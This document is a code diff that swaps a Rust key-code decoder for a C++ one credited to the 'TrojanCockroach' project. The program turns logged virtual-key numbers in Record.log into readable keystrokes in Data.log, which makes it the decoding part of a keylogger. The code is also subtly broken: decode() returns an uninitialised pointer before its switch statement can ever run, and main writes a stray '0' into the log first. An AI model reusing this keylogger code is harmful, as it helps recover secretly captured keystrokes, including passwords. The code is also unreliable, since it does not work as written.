@@ -1,9 +1,67 @@
-//decode the message you get
+//decoder taken from @MinhasKamal / TrojanCockroach
 
-fn decode(i: u8){
-    let mut ch = "";
+#include <stdio.h>
+#include <time.h>
+#include <iostream>
 
- match i{
+using namespace std;
+
+
+char* decode(int i);
+int remember=0;
+
+int main(){
+    FILE *file = fopen("Record.log", "a");
+    fprintf(file, "0");
+    fclose(file);
+
+    FILE *inputFile, *outputFile;
+
+    if((inputFile=fopen("Record.log", "r"))==NULL || (outputFile=fopen("Data.log", "a"))==NULL){
+        printf("ERROR!!!");
+        return 1;
+    }
+
+    int num;
+    char date[30];
+    char ch = fgetc(inputFile);
+    while(ch!=EOF){
+
+        if(ch=='\t'){
+            fprintf(outputFile, ">>\n");
+
+            fscanf(inputFile, "%d", &num);
+            while(num!=0){
+                fprintf(outputFile, "%s", decode(num));
+                fscanf(inputFile, "%d", &num);
+            }
+        }else{
+            fgets(date, 30, inputFile);
+            fprintf(outputFile, "%c%s", ch, date);
+        }
+
+        ch = fgetc(inputFile);
+    }
+
+    fclose(inputFile);
+    fclose(outputFile);
+
+    return 0;
+}
+
+
+char* decode(int i){
+    char* ch;
+
+    if(remember==i){
+        ch="";
+        return ch;
+    }else{
+        remember=0;
+        return ch; // :)
+    }
+
+    switch(i){
     case 1:
         ch="[LC]";
         remember=i;
@@ -51,7 +109,7 @@ fn decode(i: u8){
     case 34:
         ch="[PgDn]";
         break;
-    
+    /*
     case 37:
         ch="";
         break;
@@ -76,7 +134,7 @@ fn decode(i: u8){
     case 44:
         ch="";
         break;
-        
+        */
     case 45:
         ch="[INS]";
         break;
@@ -293,7 +351,7 @@ fn decode(i: u8){
     case 150:
         ch="-";
         break;
-    
+    /*
     case 151:
         ch="";
         break;
@@ -399,7 +457,7 @@ fn decode(i: u8){
     case 185:
         ch="";
         break;
-    
+    */
     case 186:
         ch=";";
         break;
@@ -421,7 +479,7 @@ fn decode(i: u8){
     case 192:
         ch="`";
         break;
-    
+    /*
     case 193:
         ch="";
         break;
@@ -500,7 +558,7 @@ fn decode(i: u8){
     case 218:
         ch="";
         break;
-        
+        */
     case 219:
         ch="[";
         break;
@@ -513,7 +571,7 @@ fn decode(i: u8){
     case 222:
         ch="'";
         break;
-    
+    /*
     case 223:
         ch="";
         break;
@@ -598,7 +656,7 @@ fn decode(i: u8){
     case 250:
         ch="";
         break;
-    
+    */
     default:
         ch="[U?]";
         remember=i;
